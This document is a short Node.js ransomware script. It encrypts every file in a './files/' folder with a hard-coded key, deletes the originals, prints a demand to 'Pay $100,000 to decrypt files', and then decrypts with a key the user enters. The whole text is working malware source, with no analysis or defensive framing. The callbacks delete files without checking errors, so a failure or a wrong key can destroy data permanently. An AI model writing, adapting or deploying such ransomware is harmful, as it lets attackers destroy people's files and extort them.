var encryptor = require('file-encryptor')
var fs = require('fs')

const readline = require('readline').createInterface({
    input: process.stdin,
    output: process.stdout
});

var key = 'keiani'
const testFolder = './files/';

fs.readdirSync(testFolder).forEach(file => {
    //Encrypt file
    encryptor.encryptFile(`${testFolder}${file}`,`${testFolder}${file}.encrypted`, key, function(err) {
        fs.unlinkSync(`${testFolder}${file}`)
        console.log(`File ${file} is encrypted`)  
    });
});

console.log('Pay $100,000 to decrypt files');

readline.question('\nEnter Decryption Key: ', key => {
    fs.readdirSync(testFolder).forEach(file => {
        //Decrpyt file
        encryptor.decryptFile(`${testFolder}${file}`,`${testFolder}${file}`.replace('.encrypted', ''), key, function(err) {
            fs.unlinkSync(`${testFolder}${file}`)
            console.log(`File ${file} is decrypted`)
        });
    });
    readline.close();
});